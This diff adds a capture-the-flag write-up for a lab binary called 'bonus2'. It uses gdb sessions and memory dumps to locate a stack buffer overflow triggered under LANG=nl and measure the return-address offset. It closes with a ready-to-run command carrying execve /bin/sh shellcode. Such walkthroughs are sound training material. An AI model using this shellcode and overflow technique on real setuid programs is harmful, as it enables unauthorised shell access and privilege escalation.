@@ -1,0 +1,53 @@
+Calling with very longs args makes the program segfault :
+
+    gdb> r Ax50 Bx50
+    invalid $PC address: 0x8004242
+
+To fully write over the eip, we need to run the program with a different lang:
+
+    gdb> set environnment LANG=nl
+    gdb> r
+    Invalid $PC address: 0x42424242
+
+So we can rewrite the return address of greetuser.
+We will put our shellcode into commandline arguments :
+
+    gdb> b *0xbffff842 (somewhere at the beginning of the main)
+    gdb> r
+    gdb> x/10wx $esp
+    ...                     int ac      char **av
+    0xbffff66c:	0xb7e454d3	0x00000003	0xbffff774	0xbffff784
+    ...                                 av[0]       av[1]
+    0xbffff6fc:	0xb7fff918	0x00000003	0xbffff896	0xbffff8af
+
+Adresses of our argument are :
+
+    av[1]: 0xbffff8af (size of 50)
+
+We need to find the exact offset of eip relative to copy of B
+
+    gdb> b *0x08048517  (strcat)
+    gdb> b *0x8048527   (leave)
+    gdb> r
+    gdb> x/100wx $esp
+    ...                                             eip
+    0xbffff5a0:	0xbfffff30	0xb7fff918	0xbffff668	0x08048630
+    gdb> c
+    ...                     3           7           11
+    0xbffff590:	0x41414141	0x42424241	0x42424242	0x42424242
+                15          19          23
+    0xbffff5a0:	0x42424242	0x42424242	0x42424242	0x42424242
+
+    Address of $eip is 0xbffff5ac
+    Offset = 23 bytes
+
+We'll put the shellcode in av[1] and the address in av[2]
+
+./bonus2 [shellcode][A*5] [23 bytes][0xbffff8af]
+    
+
+It does not work because gdb and real is not the same. So we just tried adding 16-32.. to the eip address :
+
+Final address: 0xbffff8df
+
+LANG=nl ./bonus2 `perl -e 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\0"x4'` `perl -e 'print "B"x23 . "\xdf\xf8\xff\xbf" . "C"x23'`
